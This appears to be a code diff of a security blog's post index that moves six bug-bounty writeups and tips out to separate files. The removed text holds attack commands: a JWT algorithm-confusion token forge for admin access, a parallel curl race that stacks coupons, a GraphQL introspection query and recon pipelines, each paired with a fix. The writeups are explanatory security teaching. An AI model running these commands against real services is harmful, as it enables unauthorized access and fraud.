@@ -8,7 +8,7 @@
     "readTime": "8 min",
     "excerpt": "How a misconfigured JWT verifier accepted RS256 tokens signed with the public key as HS256. A single trust assumption broke the entire session model.",
     "section": "writeups",
-    "content": "## Context\n\nThe target was a B2B SaaS platform issuing RS256 JWTs. The verification routine looked correct — until you fed it the public key and asked it to do HS256.\n\n## The Invariant That Broke\n\nThe assumption: `alg` field in the JWT header is trusted.\n\n```go\nfunc Verify(token string, key []byte) (*Claims, error) {\n    parsed, err := jwt.Parse(token, func(t *jwt.Token) (interface{}, error) {\n        return key, nil\n    })\n    if err != nil { return nil, err }\n    return parsed.Claims.(*Claims), nil\n}\n```\n\nThe verifier never pinned the algorithm. Swapping `alg` to `HS256` and signing with the publicly-exposed RSA public key produced a token the server happily accepted.\n\n## Exploitation\n\n```bash\ncurl https://target/.well-known/jwks.json | jq -r '.keys[0]' > pub.json\npython3 forge.py --pub pub.json --alg HS256 --sub admin > token.jwt\ncurl -H \"Authorization: Bearer $(cat token.jwt)\" https://target/api/admin/users\n```\n\n## Lesson\n\nNever trust `alg`. Pin it server-side."
+    "file": "breaking-jwt-trust-boundaries.md"
   },
   {
     "slug": "vandex-gf-recon-patterns",
@@ -19,7 +19,7 @@
     "readTime": "6 min",
     "excerpt": "A grep-fuzzy pattern engine for surfacing high-signal endpoints from massive recon corpora. Built for bug bounty operators tired of regex soup.",
     "section": "tools",
-    "content": "## Why\n\nRecon outputs grow faster than you can read them. `vandex-gf` curates pattern packs for the bugs that actually pay.\n\n```bash\ncat all_urls.txt | vandex-gf ssrf,idor,redirect | tee triage.txt\n```\n\n## Pattern Packs\n\n- `ssrf` — internal hostnames, metadata endpoints, URL parameters\n- `idor` — sequential IDs, UUIDs in unusual positions\n- `redirect` — open redirect parameter conventions\n- `auth` — token endpoints, session cookies in URL\n\n## Roadmap\n\nMoving from pure pattern matching to behaviour-aware classification."
+    "file": "vandex-gf-recon-patterns.md"
   },
   {
     "slug": "subdomain-takeover-recon",
@@ -30,7 +30,7 @@
     "readTime": "3 min",
     "excerpt": "A composable shell pipeline to enumerate, resolve, fingerprint, and triage potential takeovers in under a minute.",
     "section": "tips",
-    "content": "## The Pipeline\n\n```bash\nsubfinder -d target.com -silent | \\\n  dnsx -silent -cname -resp | \\\n  grep -Ei 'github.io|herokuapp|s3.amazonaws|azurewebsites' | \\\n  tee candidates.txt\n```\n\nThen verify each manually — automation here causes false positives that burn report credibility.\n\n## Why Manual Verification Wins\n\nThe difference between a duplicate and a P1 is reading the actual response."
+    "file": "subdomain-takeover-recon.md"
   },
   {
     "slug": "race-condition-coupon-stacking",
@@ -41,7 +41,7 @@
     "readTime": "5 min",
     "excerpt": "A 'one-per-user' coupon enforced via SELECT-then-INSERT. Twelve parallel requests, twelve discounts, one broken invariant.",
     "section": "invariant",
-    "content": "## The Broken Invariant\n\n> Each user may redeem a coupon at most once.\n\nEnforced as:\n\n```go\nif coupon.AlreadyRedeemed(userID) { return ErrUsed }\norder.ApplyDiscount(coupon)\ncoupon.MarkRedeemed(userID)\n```\n\nNo transactional lock. No unique constraint. Just hope.\n\n## Exploit\n\n```bash\nseq 1 12 | xargs -P12 -I{} curl -s -X POST \\\n  -H \"Cookie: $SESSION\" \\\n  -d 'code=WELCOME50' \\\n  https://target/checkout/apply-coupon\n```\n\nResult: 12 stacked discounts on one cart.\n\n## Fix\n\nUnique index on `(user_id, coupon_id)`. The database is the source of truth."
+    "file": "race-condition-coupon-stacking.md"
   },
   {
     "slug": "graphql-introspection-leak",
@@ -52,7 +52,7 @@
     "readTime": "4 min",
     "excerpt": "Introspection enabled in production exposed an internal admin schema. Mapping the attack surface took ten seconds.",
     "section": "writeups",
-    "content": "## Discovery\n\n```bash\ncurl -X POST https://target/graphql \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{__schema{types{name fields{name}}}}\"}' | jq\n```\n\n## What Was Exposed\n\nA mutation: `internalImpersonateUser(userId: ID!)`. Reachable. Authorized only on `role == \"support\"`. The frontend hid the link, but the resolver did not check the role.\n\n## Lesson\n\nDisable introspection in prod. Authorize at the resolver, not the UI."
+    "file": "graphql-introspection-leak.md"
   },
   {
     "slug": "burp-extender-quickstart",
@@ -63,6 +63,6 @@
     "readTime": "2 min",
     "excerpt": "A 30-line Montoya API extension that flags responses missing critical security headers. Learn the API by writing the smallest useful thing.",
     "section": "tips",
-    "content": "## The Smallest Useful Extension\n\nDrop into Burp's Extender. Highlights any response missing `Content-Security-Policy`.\n\n```java\npublic void initialize(MontoyaApi api) {\n    api.http().registerHttpHandler(new HttpHandler() {\n        @Override\n        public ResponseReceivedAction handleHttpResponseReceived(HttpResponseReceived r) {\n            if (r.headerValue(\"Content-Security-Policy\") == null) {\n                r.annotations().setHighlightColor(HighlightColor.RED);\n            }\n            return ResponseReceivedAction.continueWith(r);\n        }\n    });\n}\n```"
+    "file": "burp-extender-quickstart.md"
   }
 ]
